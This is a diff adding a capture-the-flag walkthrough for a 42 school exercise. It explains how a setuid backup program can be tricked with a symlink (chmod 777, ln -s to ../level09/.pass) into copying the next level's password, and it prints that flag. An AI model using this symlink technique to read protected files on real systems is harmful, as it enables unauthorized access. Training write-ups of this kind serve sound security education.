@@ -1,4 +1,28 @@
-chmod 777 .
-ln -s ../level09/.pass p
-./level08 p
-cat ./backups/p
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2019/05/22 21:41:18 by lgarczyn          #+#    #+#              #
+#    Updated: 2019/05/22 21:54:39 by lgarczyn         ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+The executable opens any file that belongs to level08 or the user.
+It then proceeds to create a copy readable by all in ./backups.
+It also logs the process.
+
+Unfortunately, it struggles with complex paths, as it will try 
+to copy the entire target path insides the backup folder,
+resulting in missing directory erros.
+
+We simply create a symlink to the level09 flag.
+
+> chmod 777 .
+> ln -s ../level09/.pass p
+> ./level08 p
+> cat ./backups/p
+
+< fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
